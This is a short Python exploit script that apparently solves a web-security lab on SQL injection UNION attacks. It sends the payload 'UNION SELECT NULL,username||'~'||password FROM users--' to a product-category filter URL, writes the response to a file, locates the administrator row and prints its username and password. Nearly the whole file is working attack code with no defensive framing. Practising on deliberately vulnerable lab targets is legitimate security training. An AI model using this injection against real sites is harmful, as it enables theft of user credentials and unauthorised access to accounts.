#SQL injection UNION attack, retrieving data from other tables
import requests
import os
import re

url = input("enter url : ")
path="filter?category=Gifts"
payload="'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"

r=requests.get(url+path+payload).text



file = open("filetxt","w+",encoding="utf8")
file.write(r)
file.close()


def index(filetxt): #functoin use to find administrator
 file=open(filetxt,"r+",encoding="utf8")
 file_line=[line for line in file]
 c=0
 for line in file_line :
     c += 1
     if line.find("administrator") >=0 :
         line = c -1
         file = open("filetxt")
         lines_to_print = [line]

         for index, line in enumerate(file):
           if ( index in lines_to_print):
            print(line.replace("<th>","").replace("</th>","").replace("~"," : "))
 file.close()


 os.remove("filetxt")

             

         



index("filetxt")
   
















#for keywords,line in enumerate(file):
#             if("<th>administrator</th>" in line):
#                 print(line)
